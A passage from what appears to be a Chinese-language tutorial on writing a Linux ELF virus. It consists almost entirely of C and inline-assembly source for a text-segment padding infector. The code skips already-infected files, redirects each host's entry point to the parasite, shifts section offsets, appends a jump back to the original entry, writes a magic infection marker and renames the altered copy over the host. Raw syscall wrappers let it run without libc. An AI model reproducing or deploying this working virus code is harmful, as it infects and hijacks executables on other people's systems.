        if (infected)  //如果已经被感染就继续读取下一个文件
        {
        close(fd);
            continue; 
        }
        else
        {
              p_hdr = (Elf32_Phdr *) (mem + e_hdr->e_phoff);
            for (i = e_hdr->e_phnum; i-- > 0; p_hdr++) 
        {
             /*定位text段的phdr*/
            if (text_found) 
            {
                  p_hdr->p_offset += PAGE_SIZE;
                continue;
            }
            else 
            if (p_hdr->p_type == PT_LOAD) 
            {
                  if (p_hdr->p_flags == (PF_R | PF_X)) 
                {
                        text = p_hdr->p_vaddr;
                        parasite_vaddr = p_hdr->p_vaddr + p_hdr->p_filesz;
                        old_e_entry = e_hdr->e_entry;      //覆盖旧入口点
                        e_hdr->e_entry = parasite_vaddr;  //修改入口点为寄生代码的虚拟地址
                        end_of_text = p_hdr->p_offset + p_hdr->p_filesz;
                        p_hdr->p_filesz += parasite_size;  //把文件和内存长度增加为寄生代码的长度
                        p_hdr->p_memsz += parasite_size;
                        text_found++;
                  }
            }
        }
        } 
        s_hdr = (Elf32_Shdr *) (mem + e_hdr->e_shoff);
        for (i = e_hdr->e_shnum; i-- > 0; s_hdr++) //遍历程序头
        {
              if (s_hdr->sh_offset >= end_of_text)  //根据页长度增加位于寄生代码后的节头的偏移
              s_hdr->sh_offset += PAGE_SIZE;
          else 
          if (s_hdr->sh_size + s_hdr->sh_addr == parasite_vaddr)  //把位于text段最后一个节头的大小增加为寄生代码的大小
              s_hdr->sh_size += parasite_size;
        } 
          e_hdr->e_shoff += PAGE_SIZE;  //根据页长度增加段的偏移
          mirror_binary_with_parasite (parasite_size, mem, end_of_text, st, host, address_of_main);
          close (fd);
          goto done;
      }
          done:
          close (dd);
      }
    void
    mirror_binary_with_parasite (unsigned int psize, unsigned char *mem,
      unsigned int end_of_text, struct stat st, char *host, unsigned long address_of_main)
    {
      int ofd;
      unsigned int c;
      int i, t = 0;
      int magic = 32769;
      char tmp[3];
      tmp[0] = '.'; 
      tmp[1] = 'v';
      tmp[2] = 0;
      char jmp_code[7];
      //使用jmp_code来跳转到原始入口点
      jmp_code[0] = '\x68'; /* push */
      jmp_code[1] = '\x00'; /* 00    */
      jmp_code[2] = '\x00'; /* 00    */
      jmp_code[3] = '\x00'; /* 00    */
      jmp_code[4] = '\x00'; /* 00    */
      jmp_code[5] = '\xc3'; /* ret */
      jmp_code[6] = 0;
      int return_entry_start = 1;
      ofd = open (tmp, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode);
      write (ofd, mem, end_of_text);  //扩展text段的尾部
      *(unsigned long *) &jmp_code[1] = old_e_entry;  //把原始入口点写入到寄生代码头部
      write (ofd, (char *)address_of_main, psize - 7); //将寄生代码从text段尾部写入
      write (ofd, jmp_code, 7);  //写入jmp_code
      lseek (ofd, (PAGE_SIZE - 4) - psize, SEEK_CUR); 
      write (ofd, &magic, sizeof(magic));  //将magic写入宿主文件作为标记
      mem += end_of_text;
      unsigned int last_chunk = st.st_size - end_of_text;
      write (ofd, mem, last_chunk);
      rename (tmp, host);
      close (ofd);
    }
    unsigned long get_eip(void)
    {
      __asm__("call foobar\n"
              ".globl foobar\n"
              "foobar:\n"
              "pop %eax");
    }
    /*系统调用接口定义*/
    #define __syscall0(type,name) \
    type name(void) \
    { \
    long __res; \
    __asm__ volatile ("int $0x80" \
            : "=a" (__res) \
            : "0" (__NR_##name)); \
    return(type)__res; \
    }
    #define __syscall1(type,name,type1,arg1) \
    type name(type1 arg1) \
    { \
    long __res; \
    __asm__ volatile ("int $0x80" \
            : "=a" (__res) \
    : "0" (__NR_##name),"b" ((long)(arg1))); \
    return(type)__res; \
    }
    #define __syscall2(type,name,type1,arg1,type2,arg2) \
    type name(type1 arg1,type2 arg2) \
    { \
    long __res; \
    __asm__ volatile ("int $0x80" \
            : "=a" (__res) \
            : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2))); \
    return(type)__res; \
    }
    #define __syscall3(type,name,type1,arg1,type2,arg2,type3,arg3) \
    type name(type1 arg1,type2 arg2,type3 arg3) \
    { \
    long __res; \
    __asm__ volatile ("int $0x80" \
            : "=a" (__res) \
            : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
                      "d" ((long)(arg3))); \
    return(type)__res; \
    }
    #define __syscall4(type,name,type1,arg1,type2,arg2,type3,arg3,type4,arg4) \
    type name (type1 arg1, type2 arg2, type3 arg3, type4 arg4) \
    { \
    long __res; \
    __asm__ volatile ("int $0x80" \
            : "=a" (__res) \
            : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
              "d" ((long)(arg3)),"S" ((long)(arg4))); \
    return(type)__res; \
    }
    #define __syscall5(type,name,type1,arg1,type2,arg2,type3,arg3,type4,arg4, \
              type5,arg5) \
    type name (type1 arg1,type2 arg2,type3 arg3,type4 arg4,type5 arg5) \
    { \
    long __res; \
    __asm__ volatile ("int $0x80" \
            : "=a" (__res) \
            : "0" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
              "d" ((long)(arg3)),"S" ((long)(arg4)),"D" ((long)(arg5))); \
    return(type)__res; \
    }
    #define __syscall6(type,name,type1,arg1,type2,arg2,type3,arg3,type4,arg4, \
              type5,arg5,type6,arg6) \
    type name (type1 arg1,type2 arg2,type3 arg3,type4 arg4,type5 arg5,type6 arg6) \
    { \
    long __res; \
    __asm__ volatile ("push %%ebp ; movl %%eax,%%ebp ; movl %1,%%eax ; int $0x80 ; pop %%ebp" \
            : "=a" (__res) \
            : "i" (__NR_##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
              "d" ((long)(arg3)),"S" ((long)(arg4)),"D" ((long)(arg5)), \
              "0" ((long)(arg6))); \
    return(type),__res; \
    }
    __syscall1(void, exit, int, status);
    __syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count);
    __syscall3(off_t, lseek, int, fildes, off_t, offset, int, whence);
    __syscall2(int, fstat, int, fildes, struct stat * , buf);
    __syscall2(int, rename, const char *, old, const char *, new);
    __syscall3(int, open, const char *, pathname, int, flags, mode_t, mode);
    __syscall1(int, close, int, fd);
    __syscall3(int, getdents, uint, fd, struct dirent *, dirp, uint, count);
    __syscall3(int, read, int, fd, void *, buf, size_t, count);
    __syscall2(int, stat, const char *, path, struct stat *, buf);
    //寄生代码尾部
    void end_code() {
    __asm__(".globl myend\n"
        "myend:        \n"
            "mov $1,%eax \n"    // sys_exit
            "mov $0,%ebx \n"    //normal status
        "int $0x80  \n"); 
    }
## 6.参考
《linux二进制分析》  
ELF文件病毒分析和编写：  
使用汇编编写一个病毒：